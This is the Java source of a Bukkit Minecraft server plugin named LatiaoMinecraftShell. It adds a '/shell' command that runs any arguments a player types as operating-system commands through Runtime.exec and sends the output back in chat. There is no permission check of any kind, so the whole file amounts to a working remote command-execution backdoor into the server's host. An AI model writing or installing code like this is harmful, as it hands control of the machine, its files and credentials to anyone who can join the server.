package me.latiao.latiaominecraftshell;


import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class LatiaoMinecraftShell extends JavaPlugin implements CommandExecutor {

    @Override
    public void onEnable() {
        getCommand("shell").setExecutor(this);


    }

    @Override
    public void onDisable() {

    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (command.getName().equalsIgnoreCase("shell")) {
                if (args.length > 0) {
                    try {

                        Process process = Runtime.getRuntime().exec(args);
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));


                        StringBuilder output = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            output.append(line).append("\n");
                        }
                        player.sendMessage(output.toString());

                    } catch (IOException e) {
                        e.printStackTrace();
                    }


                }
            }
        }
        return true;
    }
}